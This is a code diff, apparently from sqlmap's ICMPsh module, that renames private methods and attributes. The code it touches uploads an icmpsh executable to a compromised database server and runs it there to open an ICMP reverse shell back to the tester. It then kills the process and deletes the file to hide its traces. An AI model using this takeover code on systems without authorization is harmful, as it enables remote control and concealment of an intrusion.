@@ -25,71 +25,71 @@ class ICMPsh:
     This class defines methods to call icmpsh for plugins.
     """
 
-    def __initVars(self):
+    def _initVars(self):
         self.lhostStr = None
         self.rhostStr = None
         self.localIP = getLocalIP()
         self.remoteIP = getRemoteIP()
         self.__icmpslave = normalizePath(os.path.join(paths.SQLMAP_EXTRAS_PATH, "icmpsh", "icmpsh.exe"))
 
-    def __selectRhost(self):
+    def _selectRhost(self):
         message = "what is the back-end DBMS address? [%s] " % self.remoteIP
         address = readInput(message, default=self.remoteIP)
 
         return address
 
-    def __selectLhost(self):
+    def _selectLhost(self):
         message = "what is the local address? [%s] " % self.localIP
         address = readInput(message, default=self.localIP)
 
         return address
 
-    def __prepareIngredients(self, encode=True):
-        self.lhostStr = self.__selectLhost()
-        self.rhostStr = self.__selectRhost()
+    def _prepareIngredients(self, encode=True):
+        self.lhostStr = self._selectLhost()
+        self.rhostStr = self._selectRhost()
 
-    def __runIcmpshMaster(self):
+    def _runIcmpshMaster(self):
         infoMsg = "running icmpsh master locally"
         logger.info(infoMsg)
 
         icmpshmaster(self.lhostStr, self.rhostStr)
 
-    def __runIcmpshSlaveRemote(self):
+    def _runIcmpshSlaveRemote(self):
         infoMsg = "running icmpsh slave remotely"
         logger.info(infoMsg)
 
-        cmd = "%s -t %s -d 500 -b 30 -s 128 &" % (self.__icmpslaveRemote, self.lhostStr)
+        cmd = "%s -t %s -d 500 -b 30 -s 128 &" % (self._icmpslaveRemote, self.lhostStr)
 
         self.execCmd(cmd, silent=True)
 
     def uploadIcmpshSlave(self, web=False):
-        self.__initVars()
-        self.__randStr = randomStr(lowercase=True)
-        self.__icmpslaveRemoteBase = "tmpi%s.exe" % self.__randStr
+        self._initVars()
+        self._randStr = randomStr(lowercase=True)
+        self._icmpslaveRemoteBase = "tmpi%s.exe" % self._randStr
 
         if web:
-            self.__icmpslaveRemote = "%s/%s" % (self.webDirectory, self.__icmpslaveRemoteBase)
+            self._icmpslaveRemote = "%s/%s" % (self.webDirectory, self._icmpslaveRemoteBase)
         else:
-            self.__icmpslaveRemote = "%s/%s" % (conf.tmpPath, self.__icmpslaveRemoteBase)
+            self._icmpslaveRemote = "%s/%s" % (conf.tmpPath, self._icmpslaveRemoteBase)
 
-        self.__icmpslaveRemote = ntToPosixSlashes(normalizePath(self.__icmpslaveRemote))
+        self._icmpslaveRemote = ntToPosixSlashes(normalizePath(self._icmpslaveRemote))
 
-        logger.info("uploading icmpsh slave to '%s'" % self.__icmpslaveRemote)
+        logger.info("uploading icmpsh slave to '%s'" % self._icmpslaveRemote)
 
         if web:
-            self.webFileUpload(self.__icmpslave, self.__icmpslaveRemote, self.webDirectory)
+            self.webFileUpload(self.__icmpslave, self._icmpslaveRemote, self.webDirectory)
         else:
-            self.writeFile(self.__icmpslave, self.__icmpslaveRemote, "binary")
+            self.writeFile(self.__icmpslave, self._icmpslaveRemote, "binary")
 
     def icmpPwn(self):
-        self.__prepareIngredients()
-        self.__runIcmpshSlaveRemote()
-        self.__runIcmpshMaster()
+        self._prepareIngredients()
+        self._runIcmpshSlaveRemote()
+        self._runIcmpshMaster()
 
         debugMsg = "icmpsh master exited"
         logger.debug(debugMsg)
 
         time.sleep(1)
-        self.execCmd("taskkill /F /IM %s" % self.__icmpslaveRemoteBase, silent=True)
+        self.execCmd("taskkill /F /IM %s" % self._icmpslaveRemoteBase, silent=True)
         time.sleep(1)
-        self.delRemoteFile(self.__icmpslaveRemote)
+        self.delRemoteFile(self._icmpslaveRemote)
